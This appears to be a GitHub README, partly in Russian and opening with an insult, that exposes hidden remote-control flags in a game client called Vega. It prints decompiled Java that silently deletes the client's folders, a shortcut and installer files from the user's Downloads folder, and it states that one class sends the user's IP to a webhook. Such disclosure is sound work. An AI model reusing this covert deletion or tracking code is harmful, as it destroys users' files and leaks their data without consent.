fuck djuniks
![Image alt](https://github.com/burgerhack16/vega-065/blob/master/image.png)

CLaunch.java - a class that can be used to lock modules and check hwid
#ban# - временный бан пользователя
#banlt# - перманентный бан без возможности восстановления
#freak# - метка "freak" (специальный статус)
#clear# - удаление файлов клиента при бане
#adm# - статус администратора (отключал некоторые проверки)
#noupds# - блокировка проверки обновлений
#lockMod- - блокировка конкретных модулей
#dMK- - привязка Discord тега к пользователю

(and delete vega on ur PC)

if (this.delCL()) {
    try {
        String usersPath = FileUtils.getUserDirectory().getAbsolutePath();
        for (String deletePath : Arrays.asList(
            usersPath + "\AppData\Local\gamepath", 
            usersPath + "\AppData\Roaming\VEGA.NCO", 
            usersPath + "\Desktop\VL.lnk", 
            usersPath + "\Downloads\VL057M_Installer.exe", 
            usersPath + "\Downloads\VL058M_Installer.exe", 
            usersPath + "\Downloads\VL059B_Installer.exe", 
            usersPath + "\Downloads\VL060M_Installer.exe", 
            usersPath + "\Downloads\VL061M_Installer.exe", 
            usersPath + "\Downloads\VL062M_Installer.exe", 
            usersPath + "\Downloads\VL063M_Installer.exe", 
            usersPath + "\Downloads\VL064M_Installer.exe", 
            usersPath + "\Downloads\VL065M_Installer.exe", 
            usersPath + "\Downloads\VL066M_Installer.exe", 
            usersPath + "\Downloads\VL067M_Installer.exe", 
            usersPath + "\Downloads\VL068M_Installer.exe"
        )) {
            File file;
            if (deletePath == null || (file = new File(deletePath)) == null) continue;
            if (!file.delete()) {
                file.deleteOnExit();
            }
            for (File fileIn : file.listFiles()) {
                if (fileIn.delete()) continue;
                fileIn.deleteOnExit();
            }
        }
    } catch (Exception usersPath) {
        // empty catch block
    }
}

and EG.class webhook send ur ip
